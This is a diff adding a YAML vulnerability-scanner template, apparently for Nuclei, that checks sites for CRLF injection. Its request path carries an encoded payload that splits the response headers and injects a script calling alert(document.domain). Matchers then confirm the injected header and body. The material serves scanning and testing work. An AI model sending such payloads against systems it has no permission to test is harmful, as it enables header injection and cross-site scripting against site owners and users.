@@ -1,0 +1,25 @@
+id: crlf-injection-dk4trin
+
+info:
+  name: Custom CRLF Injection
+  author: dk4trin
+  severity: low
+  description: CRLF Injection
+  reference:
+  tags: crlf,dk4trin,an1at
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0D%0AConnection:%20Location,%20close%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2055%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Content-Length: 55'
+
+      - type: word
+        part: body
+        words:
+          - "alert(document.domain)"
